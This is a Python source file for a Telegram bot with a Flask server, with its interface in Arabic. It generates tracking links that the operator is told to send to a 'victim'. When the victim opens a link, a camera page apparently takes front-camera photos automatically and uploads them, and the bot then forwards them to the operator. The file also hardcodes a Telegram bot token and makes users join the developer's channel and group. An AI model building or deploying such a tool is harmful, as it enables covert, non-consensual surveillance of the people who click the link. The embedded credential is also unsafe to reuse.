#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import uuid
import json
import logging
import threading
from datetime import datetime
from pathlib import Path
from io import BytesIO

from flask import Flask, request, jsonify, send_from_directory, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.error import Forbidden
from PIL import Image

BOT_TOKEN = "8677515504:AAHOvzzalWMWDwUUj2QRfj1CftP40uM8omk"
CHANNEL_USERNAME = "@mun_zer1"
CHANNEL_URL = "https://t.me/mun_zer1"
GROUP_ID = -5114226079
GROUP_LINK = "https://t.me/+Bb8ZSn4cIJ1hZTk0"
DEVELOPER_ID = 8743242936
DEVELOPER_USERNAME = "@wwwmonzer123456"
PUBLIC_URL = "https://camera-bot-9sld.onrender.com"
PORT = int(os.environ.get("PORT", 5000))
PHOTOS_DIR = "captured_photos"

Path(PHOTOS_DIR).mkdir(exist_ok=True)
app = Flask(__name__)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)
active_sessions = {}

@app.route('/')
def home():
    return "The Architect Camera System - Active", 200

@app.route('/camera')
def camera_page():
    with open('camera.html', 'r', encoding='utf-8') as f:
        return render_template_string(f.read())

@app.route('/upload', methods=['POST'])
def upload_photo():
    photo = request.files.get('photo')
    uid = request.form.get('uid')
    sid = request.form.get('sid')
    number = request.form.get('number')
    if photo:
        filename = f"{sid}_{number}.jpg"
        filepath = os.path.join(PHOTOS_DIR, filename)
        img = Image.open(photo)
        img.save(filepath, 'JPEG', quality=85)
        if sid in active_sessions:
            active_sessions[sid]['photos'].append(filepath)
        logger.info(f"Photo {number} saved: {filepath}")
        return jsonify({"success": True, "photo": f"/photos/{filename}"})
    return jsonify({"success": False, "error": "No photo"}), 400

@app.route('/done', methods=['POST'])
def session_done():
    data = request.json
    sid = data.get('sid')
    if sid in active_sessions:
        active_sessions[sid]['complete'] = True
        active_sessions[sid]['photo_count'] = data.get('count', 0)
    return jsonify({"success": True})

@app.route('/failed', methods=['POST'])
def session_failed():
    data = request.json
    sid = data.get('sid')
    if sid in active_sessions:
        active_sessions[sid]['failed'] = True
        active_sessions[sid]['error'] = data.get('error', 'unknown')
    return jsonify({"success": True})

@app.route('/photos/<filename>')
def serve_photo(filename):
    return send_from_directory(PHOTOS_DIR, filename)

async def check_subscription(bot: Bot, user_id: int):
    channel_ok = False
    group_ok = False
    try:
        member = await bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            channel_ok = True
    except Forbidden:
        channel_ok = True
    except Exception as e:
        logger.error(f"Channel check error: {e}")
    try:
        member = await bot.get_chat_member(GROUP_ID, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            group_ok = True
    except Forbidden:
        group_ok = True
    except Exception as e:
        logger.error(f"Group check error: {e}")
    return channel_ok, group_ok

def get_force_sub_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 قناة المطور", url=CHANNEL_URL)],
        [InlineKeyboardButton("👥 مجموعة المطور", url=GROUP_LINK)],
        [InlineKeyboardButton("✅ تحقق من الاشتراك", callback_data="check_sub")],
    ])

def get_main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📸 جلسة جديدة", callback_data="new_session")],
        [InlineKeyboardButton("📊 جلساتي", callback_data="my_sessions")],
        [InlineKeyboardButton("👤 المطور", url=f"https://t.me/{DEVELOPER_USERNAME.replace('@', '')}")],
    ])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    channel_ok, group_ok = await check_subscription(context.bot, user_id)
    if channel_ok and group_ok:
        await update.message.reply_text(
            f"🔥 <b>أهلاً بك في بوت The Architect</b>\n\n👤 <b>المستخدم:</b> {user.mention_html()}\n🆔 <b>الآي دي:</b> <code>{user_id}</code>\n\n📸 <b>وظيفة البوت:</b>\n• ترسل رابط → يفتحه الضحية\n• تلقائياً يتصور صورتين (كاميرا أمامية)\n• الصور توصلك مباشرة هنا\n\n⚡ <b>المطور:</b> {DEVELOPER_USERNAME}",
            reply_markup=get_main_keyboard(), parse_mode="HTML"
        )
    else:
        missing = []
        if not channel_ok: missing.append("• القناة 📢")
        if not group_ok: missing.append("• المجموعة 👥")
        await update.message.reply_text(
            f"⚠️ <b>تنبيه!</b>\n\nعليك الاشتراك في:\n{chr(10).join(missing)}\n\nثم اضغط <b>تحقق من الاشتراك</b>",
            reply_markup=get_force_sub_keyboard(), parse_mode="HTML"
        )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    user = query.from_user
    if query.data == "check_sub":
        channel_ok, group_ok = await check_subscription(context.bot, user_id)
        if channel_ok and group_ok:
            await query.edit_message_text(f"✅ <b>تم التحقق!</b>\n\n🔥 <b>أهلاً بك في بوت The Architect</b>\n\n👤 <b>المستخدم:</b> {user.mention_html()}\n🆔 <b>الآي دي:</b> <code>{user_id}</code>\n\n⚡ <b>المطور:</b> {DEVELOPER_USERNAME}", reply_markup=get_main_keyboard(), parse_mode="HTML")
        else:
            missing = []
            if not channel_ok: missing.append("• القناة 📢")
            if not group_ok: missing.append("• المجموعة 👥")
            await query.edit_message_text(f"❌ <b>لم تشترك بعد في:</b>\n{chr(10).join(missing)}\n\nاشترك ثم اضغط التحقق مرة أخرى.", reply_markup=get_force_sub_keyboard(), parse_mode="HTML")
    elif query.data == "new_session":
        channel_ok, group_ok = await check_subscription(context.bot, user_id)
        if not channel_ok or not group_ok:
            await query.edit_message_text("❌ <b>يجب الاشتراك أولاً!</b>", reply_markup=get_force_sub_keyboard(), parse_mode="HTML")
            return
        sid = uuid.uuid4().hex[:12]
        active_sessions[sid] = {'user_id': user_id, 'timestamp': datetime.now(), 'photos': [], 'complete': False, 'failed': False}
        link = f"{PUBLIC_URL}/camera?uid={user_id}&sid={sid}"
        await query.edit_message_text(
            f"🎯 <b>تم إنشاء جلسة جديدة</b>\n\n<code>{link}</code>\n\n📤 أرسل هذا الرابط للضحية\n📸 الكاميرا تشتغل تلقائياً\n🖼️ الصور توصلك هنا\n\n🆔 Session: <code>{sid[:8]}</code>",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📋 نسخ الرابط", callback_data=f"copy_{sid}")],
                [InlineKeyboardButton("🔄 تحقق من الصور", callback_data=f"check_{sid}")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="back_main")],
            ]), parse_mode="HTML"
        )
    elif query.data.startswith("copy_"):
        sid = query.data.replace("copy_", "")
        link = f"{PUBLIC_URL}/camera?uid={user_id}&sid={sid}"
        await query.message.reply_text(f"📋 <code>{link}</code>", parse_mode="HTML")
    elif query.data.startswith("check_"):
        sid = query.data.replace("check_", "")
        session = active_sessions.get(sid)
        if not session:
            await query.answer("❌ الجلسة غير موجودة", show_alert=True)
            return
        photos = session.get('photos', [])
        if session.get('failed'):
            await query.edit_message_text("❌ الضحية رفض الكاميرا", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]]), parse_mode="HTML")
        elif session.get('complete') and photos:
            await query.message.reply_text(f"✅ اكتملت! جاري إرسال {len(photos)} صور...")
            for i, photo_path in enumerate(photos, 1):
                with open(photo_path, 'rb') as f:
                    await query.message.reply_photo(photo=f, caption=f"📸 صورة {i}/{len(photos)} | Session: {sid[:8]}")
            for p in photos:
                try: os.remove(p)
                except: pass
            del active_sessions[sid]
        elif photos:
            await query.answer(f"⏳ {len(photos)}/2 صور... انتظر", show_alert=True)
        else:
            await query.answer("⏳ بانتظار فتح الرابط...", show_alert=True)
    elif query.data == "my_sessions":
        user_sessions = {k: v for k, v in active_sessions.items() if v['user_id'] == user_id}
        if not user_sessions:
            await query.edit_message_text("📊 لا توجد جلسات نشطة", reply_markup=get_main_keyboard(), parse_mode="HTML")
            return
        text = "📊 <b>جلساتك:</b>\n\n"
        for sid, session in list(user_sessions.items())[:5]:
            pc = len(session.get('photos', []))
            emoji = "✅" if session.get('complete') else "⏳"
            text += f"{emoji} <code>{sid[:8]}</code> | {pc}/2\n"
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]]), parse_mode="HTML")
    elif query.data == "back_main":
        await query.edit_message_text("🔥 <b>القائمة الرئيسية</b>", reply_markup=get_main_keyboard(), parse_mode="HTML")

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != DEVELOPER_ID:
        await update.message.reply_text("❌ للمطور فقط")
        return
    if not context.args:
        await update.message.reply_text("📢 استخدم: /broadcast <النص>")
        return
    text = ' '.join(context.args)
    users = set(s['user_id'] for s in active_sessions.values())
    sent = 0
    for uid in users:
        try:
            await context.bot.send_message(uid, f"📢 <b>رسالة من المطور:</b>\n\n{text}", parse_mode="HTML")
            sent += 1
        except: pass
    await update.message.reply_text(f"✅ تم الإرسال إلى {sent} مستخدم.")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != DEVELOPER_ID:
        await update.message.reply_text("❌ للمطور فقط")
        return
    total = len(active_sessions)
    complete = sum(1 for s in active_sessions.values() if s.get('complete'))
    failed = sum(1 for s in active_sessions.values() if s.get('failed'))
    photos = sum(len(s.get('photos', [])) for s in active_sessions.values())
    await update.message.reply_text(f"📊 <b>إحصائيات</b>\n\n🟢 نشطة: {total}\n✅ مكتملة: {complete}\n❌ فاشلة: {failed}\n📸 صور: {photos}\n\n👤 {DEVELOPER_USERNAME}", parse_mode="HTML")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}")

def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False)

def run_bot():
    telegram_app = Application.builder().token(BOT_TOKEN).build()
    telegram_app.add_handler(CommandHandler("start", start))
    telegram_app.add_handler(CommandHandler("broadcast", broadcast_command))
    telegram_app.add_handler(CommandHandler("stats", stats_command))
    telegram_app.add_handler(CallbackQueryHandler(button_handler))
    telegram_app.add_error_handler(error_handler)
    logger.info("✅ Bot Running...")
    telegram_app.run_polling()

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    run_bot()
